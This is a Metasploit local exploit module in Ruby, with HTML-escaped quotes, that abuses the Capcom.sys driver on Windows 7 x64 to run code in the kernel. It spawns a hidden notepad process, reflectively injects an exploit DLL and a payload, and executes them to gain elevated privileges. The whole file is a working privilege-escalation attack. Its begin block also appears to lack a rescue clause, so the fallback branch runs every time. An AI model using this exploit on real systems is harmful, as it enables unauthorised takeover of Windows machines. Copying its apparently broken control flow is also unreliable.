# This module requires Metasploit: http://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##
 
require &#039;msf/core&#039;
require &#039;msf/core/post/windows/reflective_dll_injection&#039;
require &#039;rex&#039;
 
class MetasploitModule < Msf::Exploit::Local
  Rank = NormalRanking
 
  include Msf::Post::File
  include Msf::Post::Windows::Priv
  include Msf::Post::Windows::Process
  include Msf::Post::Windows::ReflectiveDLLInjection
 
  def initialize(info={})
    super(update_info(info, {
      &#039;Name&#039;            => &#039;Windows Capcom.sys Kernel Execution Exploit (x64 only)&#039;,
      &#039;Description&#039;     => %q{
        This module abuses the Capcom.sys kernel driver&#039;s function that allows for an
        arbitrary function to be executed in the kernel from user land. This function
        purposely disables SMEP prior to invoking a function given by the caller.
        This has been tested on Windows 7 x64.
      },
      &#039;License&#039;         => MSF_LICENSE,
      &#039;Author&#039;          => [
          &#039;TheWack0lian&#039;,    # Issue discovery
          &#039;OJ Reeves&#039;        # exploit and msf module
        ],
      &#039;Arch&#039;            => [ ARCH_X86_64],
      &#039;Platform&#039;        => &#039;win&#039;,
      &#039;DefaultOptions&#039;  => {
          &#039;EXITFUNC&#039;    => &#039;thread&#039;,
        },
      &#039;Targets&#039;         => [
          [ &#039;Windows x64 (<= 8)&#039;, { &#039;Arch&#039; => ARCH_X86_64 } ]
        ],
      &#039;Payload&#039;         => {
          &#039;Space&#039;       => 4096,
          &#039;DisableNops&#039; => true
        },
      &#039;References&#039;      => [
          [&#039;URL&#039;, &#039;https://twitter.com/TheWack0lian/status/779397840762245124&#039;]
        ],
      &#039;DisclosureDate&#039;  => &#039;Jan 01 1999&#039;, # non-vuln exploit date
      &#039;DefaultTarget&#039;   => 0
    }))
  end
 
  def check
    if sysinfo[&#039;OS&#039;] !~ /windows 7/i
      return Exploit::CheckCode::Unknown
    end
 
    if sysinfo[&#039;Architecture&#039;] =~ /(wow|x)64/i
      arch = ARCH_X86_64
    else
      return Exploit::CheckCode::Safe
    end
 
    file_path = expand_path(&#039;%windir%&#039;) << &#039;\\system32\\capcom.sys&#039;
    return Exploit::CheckCode::Safe unless file_exist?(file_path)
 
    # TODO: check for the capcom.sys driver and its version.
    return Exploit::CheckCode::Appears
  end
 
  def exploit
    if is_system?
      fail_with(Failure::None, &#039;Session is already elevated&#039;)
    end
 
    check_result = check
    if check_result == Exploit::CheckCode::Safe || check_result == Exploit::CheckCode::Unknown
      fail_with(Failure::NotVulnerable, &#039;Exploit not available on this system.&#039;)
    end
 
    if sysinfo[&#039;Architecture&#039;] =~ /wow64/i
      fail_with(Failure::NoTarget, &#039;Running against WOW64 is not supported, please get an x64 session&#039;)
    elsif sysinfo[&#039;Architecture&#039;] =~ /x64/ && target.arch.first == ARCH_X86
      fail_with(Failure::NoTarget, &#039;Session host is x64, but the target is specified as x86&#039;)
    end
 
    print_status(&#039;Launching notepad to host the exploit...&#039;)
    notepad_process = client.sys.process.execute(&#039;notepad.exe&#039;, nil, {&#039;Hidden&#039; => true})
    begin
      process = client.sys.process.open(notepad_process.pid, PROCESS_ALL_ACCESS)
      print_good("Process #{process.pid} launched.")
      # Reader Sandbox won&#039;t allow to create a new process:
      # stdapi_sys_process_execute: Operation failed: Access is denied.
      print_status(&#039;Operation failed. Trying to elevate the current process...&#039;)
      process = client.sys.process.open
    end
 
    print_status("Reflectively injecting the exploit DLL into #{process.pid}...")
 
    library_path = ::File.join(Msf::Config.data_directory, &#039;exploits&#039;, &#039;capcom_sys_exec&#039;,
                               &#039;capcom_sys_exec.x64.dll&#039;)
    library_path = ::File.expand_path(library_path)
 
    print_status("Injecting exploit into #{process.pid}...")
    exploit_mem, offset = inject_dll_into_process(process, library_path)
 
    print_status("Exploit injected. Injecting payload into #{process.pid}...")
    payload_mem = inject_into_process(process, payload.encoded)
 
    # invoke the exploit, passing in the address of the payload that
    # we want invoked on successful exploitation.
    print_status(&#039;Payload injected. Executing exploit...&#039;)
    process.thread.create(exploit_mem + offset, payload_mem)
 
    print_good(&#039;Exploit finished, wait for (hopefully privileged) payload execution to complete.&#039;)
  end
 
end

